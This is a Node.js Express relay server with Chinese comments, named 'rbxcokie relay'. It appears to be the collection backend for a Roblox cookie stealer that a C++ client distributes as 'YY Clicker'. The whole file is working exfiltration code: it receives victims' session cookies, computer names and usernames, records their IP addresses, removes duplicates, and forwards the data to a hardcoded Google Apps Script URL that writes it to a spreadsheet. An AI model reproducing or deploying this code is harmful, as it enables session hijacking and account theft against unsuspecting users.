/**
 * Railway 中轉伺服器
 * 
 * 功能：
 *   1. 接收來自 C++ 客戶端的 POST /api/cookie 請求
 *   2. 驗證資料格式
 *   3. Cookie 一小時內去重（相同 Cookie 值不重複寫入）
 *   4. 將資料轉發至 Google Apps Script Web App
 *   5. 回傳處理結果
 *
 * 環境變數（在 Railway 設定）：
 *   - GOOGLE_SCRIPT_URL : Google Apps Script 部署後的 Web App URL
 *   - PORT             : Railway 自動提供，預設 3000
 */

const express = require("express");
const fetch   = require("node-fetch");
const crypto  = require("crypto");

const app  = express();
const PORT = process.env.PORT || 3000;

const GOOGLE_SCRIPT_URL = process.env.GOOGLE_SCRIPT_URL || "https://script.google.com/macros/s/AKfycbxFID2dQMjC5xK228bkORU9ZYXICwtfdJ7gFSuOA3Xe69bULbpN9uKdmSLT_9xECW6usw/exec";

// ======================================================================
// Cookie 去重快取（一小時內相同 Cookie 不重複寫入）
// ======================================================================
// 使用 SHA-256 雜湊儲存，不保留原始 Cookie 值（安全考量）
const cookieCache = new Map();  // key: hash, value: timestamp
const DEDUP_WINDOW_MS = 60 * 60 * 1000;  // 1 小時

function getCookieHash(cookie) {
  return crypto.createHash("sha256").update(cookie).digest("hex");
}

function isDuplicateCookie(cookie) {
  const hash = getCookieHash(cookie);
  const now = Date.now();

  // 清理過期的快取項目（每次檢查時順便清理）
  for (const [key, timestamp] of cookieCache.entries()) {
    if (now - timestamp > DEDUP_WINDOW_MS) {
      cookieCache.delete(key);
    }
  }

  if (cookieCache.has(hash)) {
    const lastTime = cookieCache.get(hash);
    if (now - lastTime < DEDUP_WINDOW_MS) {
      return true;  // 一小時內重複
    }
  }

  // 記錄此 Cookie
  cookieCache.set(hash, now);
  return false;
}

// ── 中介層 ──────────────────────────────────────────────────────────
app.use(express.json({ limit: "1mb" }));

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

// ── 健康檢查 ────────────────────────────────────────────────────────
app.get("/", (req, res) => {
  res.json({
    status: "ok",
    message: "rbxcokie relay server is running",
    cache_size: cookieCache.size,
    timestamp: new Date().toISOString()
  });
});

app.get("/health", (req, res) => {
  res.json({ status: "ok", cache_size: cookieCache.size });
});

// ── 主要端點：接收 Cookie 資料 ──────────────────────────────────────
app.post("/api/cookie", async (req, res) => {
  try {
    const { computer_name, username, cookie, source } = req.body;

    if (!cookie || cookie.length < 20) {
      return res.status(400).json({
        status: "error",
        message: "Cookie 資料無效或過短"
      });
    }

    // [去重檢查] 一小時內相同 Cookie 不重複寫入
    if (isDuplicateCookie(cookie)) {
      console.log(`[${new Date().toISOString()}] Cookie 重複（一小時內已收到），跳過寫入`);
      return res.json({
        status: "ok",
        message: "Cookie 已在一小時內記錄過，跳過重複寫入",
        duplicate: true
      });
    }

    const clientIP = req.headers["x-forwarded-for"]
      || req.connection.remoteAddress
      || "unknown";

    const payload = {
      computer_name: computer_name || "N/A",
      username:      username      || "N/A",
      cookie:        cookie,
      ip:            clientIP,
      source:        source        || "YY Clicker",
      version:       req.body.version || "unknown",
      timestamp:     new Date().toISOString()
    };

    console.log(`[${new Date().toISOString()}] 收到新 Cookie — 電腦: ${payload.computer_name}, 使用者: ${payload.username}, IP: ${clientIP}`);

    if (!GOOGLE_SCRIPT_URL) {
      console.error("GOOGLE_SCRIPT_URL 未設定！");
      return res.status(500).json({
        status: "error",
        message: "伺服器未設定 Google Script URL"
      });
    }

    const gsResponse = await fetch(GOOGLE_SCRIPT_URL, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify(payload),
      redirect: "follow"
    });

    const gsResult = await gsResponse.text();
    let gsJson;
    try {
      gsJson = JSON.parse(gsResult);
    } catch {
      gsJson = { raw: gsResult };
    }

    console.log(`[${new Date().toISOString()}] Google Script 回應:`, gsJson);

    return res.json({
      status: "ok",
      message: "資料已成功轉發至 Google 試算表",
      duplicate: false,
      google_response: gsJson
    });

  } catch (err) {
    console.error(`[${new Date().toISOString()}] 錯誤:`, err.message);
    return res.status(500).json({
      status: "error",
      message: err.message
    });
  }
});

// ── 啟動伺服器 ──────────────────────────────────────────────────────
app.listen(PORT, "0.0.0.0", () => {
  console.log(`[rbxcokie relay] 伺服器已啟動，監聽 port ${PORT}`);
  console.log(`[rbxcokie relay] GOOGLE_SCRIPT_URL = ${GOOGLE_SCRIPT_URL ? "已設定" : "⚠ 未設定"}`);
  console.log(`[rbxcokie relay] Cookie 去重視窗 = 1 小時`);
});
